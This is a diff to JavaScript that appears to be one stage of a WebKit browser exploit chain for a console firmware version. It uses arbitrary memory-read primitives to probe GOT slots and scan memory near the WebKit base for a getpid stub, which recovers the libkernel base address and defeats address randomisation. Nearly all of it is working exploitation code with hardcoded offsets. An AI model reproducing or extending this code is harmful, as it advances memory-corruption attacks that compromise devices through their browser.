@@ -103,44 +103,127 @@ function plausibleExtPtr(fnPtr, webkitBase, off) {
     return true;
 }
 
-function lkAligned(lk) {
-    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
+function bigToPtr(b) {
+    return new int64(Number(b & 0xffffffffn), Number((b >> 32n) & 0xffffffffn));
 }
 
-/**
- * Verify one GOT slot — at most 2 reads beyond the initial read8:
- * read8(slot) + read1(module base or fn entry).
- */
-function safeVerifyGotSlot(p, webkitBase, off, rva) {
-    if (!rvaAllowed(rva, off)) return null;
+function ptrBig(w) {
+    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
+}
 
-    const fnPtr = read8p(p, webkitBase.add32(rva));
-    if (!plausibleExtPtr(fnPtr, webkitBase, off)) return null;
+const K_ERROR_CANDS = [0x26420, 0x26430, 0x25000, 0x30000, 0xd9d0];
 
+function kErrorCandidates(off) {
+    const out = [];
+    if (off.k__error != null) out.push(off.k__error);
+    for (let i = 0; i < K_ERROR_CANDS.length; i++) {
+        const v = K_ERROR_CANDS[i];
+        if (out.indexOf(v) < 0) out.push(v);
+    }
+    return out;
+}
+
+function lkFromFnPtr(p, fnPtr, off, iatRva) {
     if (isGetpidStub(fnPtr) && off.k_stubs && off.k_stubs[20] != null) {
         const lk = fnPtr.sub32(off.k_stubs[20]);
         if (lkAligned(lk) && isLibkernelPrologue(p, lk))
-            return { lk, iatRva: rva, errorFn: fnPtr, via: "getpid" };
-        return null;
+            return { lk, iatRva, errorFn: fnPtr, via: "getpid" };
     }
 
     const entryB0 = read1p(p, fnPtr);
     if (entryB0 !== 0xb8) return null;
 
-    if (off.k__error != null) {
-        const lk = fnPtr.sub32(off.k__error);
+    const errs = kErrorCandidates(off);
+    for (let i = 0; i < errs.length; i++) {
+        const lk = fnPtr.sub32(errs[i]);
         if (lkAligned(lk) && isLibkernelPrologue(p, lk))
-            return { lk, iatRva: rva, errorFn: fnPtr, via: "error" };
+            return { lk, iatRva, errorFn: fnPtr, via: "error+" + errs[i].toString(16) };
     }
 
     const pageBase = new int64((fnPtr.low >>> 0) & ~0x3fff, fnPtr.hi >>> 0);
     if (lkAligned(pageBase) && isLibkernelPrologue(p, pageBase))
-        return { lk: pageBase, iatRva: rva, errorFn: fnPtr, via: "page" };
+        return { lk: pageBase, iatRva, errorFn: fnPtr, via: "page" };
 
     return null;
 }
 
-/** PT_LOAD segments that are writable and within mapped cap (ELF header reads only). */
+function lkAligned(lk) {
+    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
+}
+
+/** Verify one GOT slot — read8(slot) + ≤3 read1 follow-ups max. */
+function safeVerifyGotSlot(p, webkitBase, off, rva) {
+    if (!rvaAllowed(rva, off)) return null;
+    const fnPtr = read8p(p, webkitBase.add32(rva));
+    if (!plausibleExtPtr(fnPtr, webkitBase, off)) return null;
+    return lkFromFnPtr(p, fnPtr, off, rva);
+}
+
+/** Sparse getpid stub hunter ±128MB from webkit (1 read8 per 1MB step). */
+function scanLibkernelStubChunk(p, webkitBase, off, sub) {
+    const stubOff = off.k_stubs && off.k_stubs[20];
+    if (!stubOff) {
+        return { done: true, lk: null, state: sub, phase: "stub-skip" };
+    }
+
+    const RADIUS = 0x8000000n;
+    const STEP = 0x1000n;
+
+    if (!sub) {
+        const center = ptrBig(webkitBase);
+        sub = {
+            cursor: center > RADIUS ? center - RADIUS : 0n,
+            end: center + RADIUS,
+            step: STEP,
+            probes: 0,
+        };
+        return {
+            done: false,
+            state: sub,
+            phase: "stub-start",
+            from: sub.cursor.toString(16),
+            to: sub.end.toString(16),
+        };
+    }
+
+    let batch = 0;
+    while (sub.cursor <= sub.end && batch < 16) {
+        const addr = bigToPtr(sub.cursor);
+        if (addr.hi >= 0x8) {
+            sub.probes++;
+            const v = read8p(p, addr);
+            if (isGetpidStub(v)) {
+                const lk = addr.sub32(stubOff);
+                if (lkAligned(lk) && isLibkernelPrologue(p, lk)) {
+                    saveLibkernelSession(lk, null);
+                    return {
+                        done: true,
+                        lk,
+                        iatRva: null,
+                        source: "stub-near",
+                        stubAt: String(addr),
+                        state: sub,
+                        phase: "stub-hit",
+                    };
+                }
+            }
+        }
+        sub.cursor += sub.step;
+        batch++;
+    }
+
+    if (sub.cursor > sub.end) {
+        return { done: true, lk: null, state: sub, phase: "stub-miss", probes: sub.probes };
+    }
+
+    return {
+        done: false,
+        state: sub,
+        phase: "stub",
+        at: sub.cursor.toString(16),
+        probes: sub.probes,
+    };
+}
 export function elfMappedRwRanges(p, webkitBase, off) {
     const cap = iatCap(off);
     if (read4p(p, webkitBase) !== ELF_MAGIC) return [];
@@ -273,6 +356,73 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
     return { done: true, lk: null, state };
 }
 
+/**
+ * RW GOT scan, then sparse getpid-stub hunt if RW misses.
+ */
+export function scanLibkernelChunk(p, webkitBase, off, state) {
+    if (!state) {
+        state = { stage: "rw", sub: null, rwSlots: 0, done: false };
+    }
+
+    if (state.stage === "rw") {
+        const c = scanErrorIatChunk(p, webkitBase, off, state.sub);
+        state.sub = c.state;
+        if (c.slots != null) state.rwSlots = c.slots;
+        if (c.done && c.lk) {
+            return {
+                done: true,
+                lk: c.lk,
+                iatRva: c.iatRva,
+                source: c.source,
+                state,
+                phase: c.phase,
+            };
+        }
+        if (c.done) {
+            state.stage = "stub";
+            state.sub = null;
+            return {
+                done: false,
+                state,
+                phase: "stub-next",
+                prev: c.phase,
+                slots: state.rwSlots,
+            };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    if (state.stage === "stub") {
+        const c = scanLibkernelStubChunk(p, webkitBase, off, state.sub);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return {
+                done: true,
+                lk: c.lk,
+                iatRva: c.iatRva,
+                source: c.source,
+                state,
+                phase: c.phase,
+                stubAt: c.stubAt,
+            };
+        }
+        if (c.done) {
+            state.done = true;
+            return {
+                done: true,
+                lk: null,
+                state,
+                phase: c.phase,
+                probes: c.probes,
+                slots: state.rwSlots,
+            };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    return { done: true, lk: null, state };
+}
+
 export function resolveLibkernel(p, webkitBase, off, opts) {
     opts = opts || {};
     const log = opts.log || (() => {});
@@ -303,8 +453,8 @@ export function resolveLibkernel(p, webkitBase, off, opts) {
         }
     }
 
-    log("LK-BLOCK", "13.00 IAT +0x3cb8cc8 unmapped — use Scan IAT or paste libkernel");
-    return { ok: false, error: "tap Scan IAT (RW GOT) or paste libkernel base" };
+    log("LK-BLOCK", "13.00 IAT +0x3cb8cc8 unmapped — Scan libkernel or paste base");
+    return { ok: false, error: "tap Scan libkernel or paste libkernel base" };
 }
 
 /** Validate user-pasted libkernel base (1 read). */
